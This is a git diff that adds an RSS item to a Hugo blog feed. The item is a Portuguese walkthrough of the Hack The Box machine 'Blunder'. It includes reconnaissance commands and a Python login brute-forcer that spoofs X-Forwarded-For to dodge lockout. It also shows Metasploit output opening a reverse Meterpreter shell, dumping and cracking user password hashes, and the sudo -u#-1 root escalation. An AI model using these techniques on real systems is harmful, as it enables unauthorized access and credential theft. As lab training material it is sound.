@@ -7,8 +7,52 @@
     <ttl>1440</ttl>
     <generator>Hugo 0.73.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 17 Oct 2020 16:43:02 UT</lastBuildDate>
+    <lastBuildDate>Sun, 18 Oct 2020 01:19:11 UT</lastBuildDate>
     <atom:link href="/htb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Blunder</title>
+      <link>/htb/blunder/</link>
+      <pubDate>Sun, 18 Oct 2020 01:06:42 UT</pubDate>
+      <guid>/htb/blunder/</guid>
+      <description>nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191 python3 dirsearch.py -u http://10.10.10.191 -e * wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u &amp;quot;http://10.10.10.191/FUZZ.txt&amp;quot; -t 100
+******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.191/FUZZ.txt Total requests: 3024 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000002755: 200 4 L 23 W 118 Ch &amp;#34;todo&amp;#34; Total time: 76.03240 Processed Requests: 3024 Filtered Requests: 3023 Requests/sec.: 39.77251 gerando wordlist com palavras do site</description>
+      <content:encoded><![CDATA[nmap -sV -sC -Pn -T4 -v -p- --min-rate=10000 10.10.10.191 python3 dirsearch.py -u http://10.10.10.191 -e * wfuzz -c -w /usr/share/wordlists/wfuzz/general/big.txt --hc 404,403 -u &amp;quot;http://10.10.10.191/FUZZ.txt&amp;quot; -t 100
+******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.191/FUZZ.txt Total requests: 3024 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000002755: 200 4 L 23 W 118 Ch &amp;#34;todo&amp;#34; Total time: 76.03240 Processed Requests: 3024 Filtered Requests: 3023 Requests/sec.: 39.77251 gerando wordlist com palavras do site
+cewl -w wordlists.txt -d 10 -m 1 http://10.10.10.191/
+deixei minha wordlist criada no /root, agora pego o script em python do brute force
+Crie o arquivo chamado brute.py
+Para executa-lo basta rodar o python3 brute.py
+Dentro do script mude o caminho da sua wordlist, no caso a minha ficou no /root/wordlists.txt
+import re import requests #from __future__ import print_function def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] host = &amp;#39;http://10.10.10.191&amp;#39; login_url = host &#43; &amp;#39;/admin/login&amp;#39; username = &amp;#39;fergus&amp;#39; wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break SUCCESS: Password found! Use fergus:RolandDeschain to login. Resultado do script ^
+Depois disso vc vai ver que tem uma aplicação chamada Bludit CMS rodando no site dentro do #http://10.10.10.191/admin/dashboard
+Você pode procurar o exploit na internet dessa aplicação #https://www.exploit-db.com/exploits/47699
+msf5 &amp;gt; use exploit/linux/http/bludit_upload_images_exec msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set TARGET 0 TARGET =&amp;gt; 0 msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set RHOSTS 10.10.10.191 RHOSTS =&amp;gt; 10.10.10.191 msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set RPORT 80 RPORT =&amp;gt; 80 msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITUSER fergus BLUDITUSER =&amp;gt; fergus msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; set BLUDITPASS RolandDeschain BLUDITPASS =&amp;gt; RolandDeschain msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; exploit [-] Exploit failed: An exploitation error occurred. [*] Exploit completed, but no session was created. msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; options Erro encontrado ao rodar o metasploit
+investigando o motivo deste erro.
+Constatado erro na versão do metasploit metasploit v5.0.94-dev
+a versão stable é a versão metasploit v5.0.87-dev
+Essa versão no exploit do meterpreter é setado o LHOSTS automaticamente na porta 4444
+msf5 exploit(linux/http/bludit_upload_images_exec) &amp;gt; run [*] Started reverse TCP handler on 10.10.14.251:4444 [&#43;] Logged in as: fergus [*] Retrieving UUID... [*] Uploading tmgeRqhFfL.png... [*] Uploading .htaccess... [*] Executing tmgeRqhFfL.png... [*] Sending stage (38288 bytes) to 10.10.10.191 [*] Meterpreter session 1 opened (10.10.14.251:4444 -&amp;gt; 10.10.10.191:45134) at 2020-06-29 08:47:30 -0400 [&#43;] Deleted .htaccess meterpreter &amp;gt; sysinfo Computer : blunder OS : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64 Meterpreter : php/linux meterpreter &amp;gt; meterpreter &amp;gt; shell Process 4207 created. Channel 0 created. id uid=33(www-data) gid=33(www-data) groups=33(www-data) python -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ Entrar no path abaixo e dar um cat no users.php
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php cat users.php &amp;lt;?php defined(&amp;#39;BLUDIT&amp;#39;) or die(&amp;#39;Bludit CMS.&amp;#39;); ?&amp;gt; { &amp;#34;admin&amp;#34;: { &amp;#34;nickname&amp;#34;: &amp;#34;Hugo&amp;#34;, &amp;#34;firstName&amp;#34;: &amp;#34;Hugo&amp;#34;, &amp;#34;lastName&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;role&amp;#34;: &amp;#34;User&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;faca404fd5c0a31cf1897b823c695c85cffeb98d&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;registered&amp;#34;: &amp;#34;2019-11-27 07:40:55&amp;#34;, &amp;#34;tokenRemember&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;tokenAuth&amp;#34;: &amp;#34;b380cb62057e9da47afce66b4615107d&amp;#34;, &amp;#34;tokenAuthTTL&amp;#34;: &amp;#34;2009-03-15 14:00&amp;#34;, &amp;#34;twitter&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;facebook&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;instagram&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;codepen&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;linkedin&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;github&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;gitlab&amp;#34;: &amp;#34;&amp;#34;} } temos a password e os dados do usuário hugo
+podemos identificar uma hash dentro de password
+#$ hashid faca404fd5c0a31cf1897b823c695c85cffeb98d
+se não identificar pelo comando hashid use um site para decriptografar md5
+pode ser o https://md5decrypt.net/en/Sha1
+#faca404fd5c0a31cf1897b823c695c85cffeb98d : Password120 essa password é do user hugo
+agora eu saio do usuário de permissão do apache www-data para o usuário do Hugo
+www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo su hugo Password: Password120 hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ Dentro da home do hugo tenho o arquivo user.txt
+hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ cd ~ cd ~ hugo@blunder:~$ ls ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt hugo@blunder:~$ cat user.txt cat user.txt d837bfc74affbc6e39b91e489bb9fbb8 hugo@blunder:~$ obs&amp;gt; auto-complete com não vai funcionar dentro do meterpreter
+subindo privilegio para root hugo@blunder:~$ sudo -l sudo -l Password: Password120 Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User hugo may run the following commands on blunder: (ALL, !root) /bin/bash hugo@blunder:~$ consigo ver o secure path local
+depois disso verificar a versão da bash
+hugo@blunder:~$ bash -version bash -version GNU bash, version 5.0.3(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2019 Free Software Foundation, Inc. License GPLv3&#43;: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt; This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. hugo@blunder:~$ GNU bash, version 5.0.3
+Pesquisei no google sudo (all root) /bin/bash
+Ele deu um link do exploit-db
+https://www.exploit-db.com/exploits/47502
+existe um exploit de uma linha que posso especificar pelo id de usuário, no caso do hugo , para conceder a ele o root ALL
+uma simples linha &amp;gt;
+hugo@blunder:~$ sudo -u#-1 /bin/bash sudo -u#-1 /bin/bash Password: Password120 root@blunder:/home/hugo# root@blunder:/home/hugo# cd /root cd /root root@blunder:/root# ls ls root.txt root@blunder:/root# cat root.txt cat root.txt c5a6c440602c9465a35ba11af04a0910 root@blunder:/root# basta entrar na home do /root
+e visualizar a flag
+]]></content:encoded>
+    </item>
     <item>
       <title>Hack the Box</title>
       <link>/htb/teste/</link>
